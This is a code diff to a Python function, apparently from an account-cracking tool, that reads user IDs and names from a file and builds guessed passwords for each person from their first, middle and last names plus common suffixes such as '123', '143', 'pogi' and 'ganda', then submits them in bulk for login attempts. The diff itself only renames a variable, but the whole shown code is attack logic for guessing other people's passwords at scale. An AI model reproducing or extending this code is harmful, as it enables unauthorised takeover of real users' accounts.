@@ -126,22 +126,22 @@ def gxdsforward(id_file):
             nam=data.split("|")[1]
             name=nam.lower()
             try:
-                name1=name.split(" ")[0]
+                f_name=name.split(" ")[0]
                 nam1=nam.split(" ")[0]
-                if len(name1) <3:
+                if len(f_name) <3:
                     pass
                 else:
                     gxdpwd.append(nam1+'123')
-                    gxdpwd.append(name1+'12')
-                    gxdpwd.append(name1+'123')
-                    gxdpwd.append(name1+'123')
-                    gxdpwd.append(name1+'1234')
-                    gxdpwd.append(name1+'12345')
-                    gxdpwd.append(name1+'@123')
-                    gxdpwd.append(name1+'pogi')
-                    gxdpwd.append(name1+'ganda')
-                    gxdpwd.append(name1+'143')
-                    gxdpwd.append(name1+'@143')
+                    gxdpwd.append(f_name+'12')
+                    gxdpwd.append(f_name+'123')
+                    gxdpwd.append(f_name+'123')
+                    gxdpwd.append(f_name+'1234')
+                    gxdpwd.append(f_name+'12345')
+                    gxdpwd.append(f_name+'@123')
+                    gxdpwd.append(f_name+'pogi')
+                    gxdpwd.append(f_name+'ganda')
+                    gxdpwd.append(f_name+'143')
+                    gxdpwd.append(f_name+'@143')
             except:pass
             try:
                 mid_name=name.split(" ")[1]
@@ -160,21 +160,21 @@ def gxdsforward(id_file):
                     gxdpwd.append(mid_name+'@')
                     gxdpwd.append(mid_name+'@123')
                     #-Mix
-                    gxdpwd.append(name1+mid_name)
-                    gxdpwd.append(name1+mid_name+'143')
-                    gxdpwd.append(name1+mid_name+'12')
-                    gxdpwd.append(name1+mid_name+'123')
-                    gxdpwd.append(name1+mid_name+'1234')
-                    gxdpwd.append(name1+mid_name+'12345')
-                    gxdpwd.append(name1+mid_name+'@#')
-                    gxdpwd.append(name1+mid_name+'@@')
-                    gxdpwd.append(name1+mid_name+'@')
-                    gxdpwd.append(name1+mid_name+'@123')
-                    gxdpwd.append(name1+' '+mid_name)
-                    gxdpwd.append(name1+' '+mid_name+'123')
-                    gxdpwd.append(name1+' '+mid_name+'143')
-                    gxdpwd.append(name1+' '+mid_name+'1234')
-                    gxdpwd.append(name1+' '+sur_name)
+                    gxdpwd.append(f_name+mid_name)
+                    gxdpwd.append(f_name+mid_name+'143')
+                    gxdpwd.append(f_name+mid_name+'12')
+                    gxdpwd.append(f_name+mid_name+'123')
+                    gxdpwd.append(f_name+mid_name+'1234')
+                    gxdpwd.append(f_name+mid_name+'12345')
+                    gxdpwd.append(f_name+mid_name+'@#')
+                    gxdpwd.append(f_name+mid_name+'@@')
+                    gxdpwd.append(f_name+mid_name+'@')
+                    gxdpwd.append(f_name+mid_name+'@123')
+                    gxdpwd.append(f_name+' '+mid_name)
+                    gxdpwd.append(f_name+' '+mid_name+'123')
+                    gxdpwd.append(f_name+' '+mid_name+'143')
+                    gxdpwd.append(f_name+' '+mid_name+'1234')
+                    gxdpwd.append(f_name+' '+sur_name)
             except:pass
             try:
                 sur_name=name.split(" ")[2]
@@ -186,15 +186,15 @@ def gxdsforward(id_file):
                     gxdpwd.append(sur_name+'1234')
                     gxdpwd.append(sur_name+'12345')
                     gxdpwd.append(sur_name+'143')
-                    gxdpwd.append(name1+mid_name+sur_name)
-                    gxdpwd.append(name1+mid_name+sur_name+'123')
-                    gxdpwd.append(name1+mid_name+sur_name+'1234')
-                    gxdpwd.append(name1+mid_name+sur_name+'12345')
-                    gxdpwd.append(name1+mid_name+sur_name+'@#')
-                    gxdpwd.append(name1+mid_name+sur_name+'@@')
-                    gxdpwd.append(name1+mid_name+sur_name+'@')
-                    gxdpwd.append(name1+' '+mid_name+' '+sur_name)
-                    gxdpwd.append(name1+' '+mid_name+' '+sur_name+'123')
+                    gxdpwd.append(f_name+mid_name+sur_name)
+                    gxdpwd.append(f_name+mid_name+sur_name+'123')
+                    gxdpwd.append(f_name+mid_name+sur_name+'1234')
+                    gxdpwd.append(f_name+mid_name+sur_name+'12345')
+                    gxdpwd.append(f_name+mid_name+sur_name+'@#')
+                    gxdpwd.append(f_name+mid_name+sur_name+'@@')
+                    gxdpwd.append(f_name+mid_name+sur_name+'@')
+                    gxdpwd.append(f_name+' '+mid_name+' '+sur_name)
+                    gxdpwd.append(f_name+' '+mid_name+' '+sur_name+'123')
             except:pass
             feel.submit(file_subb,uid,gxdpwd)
 
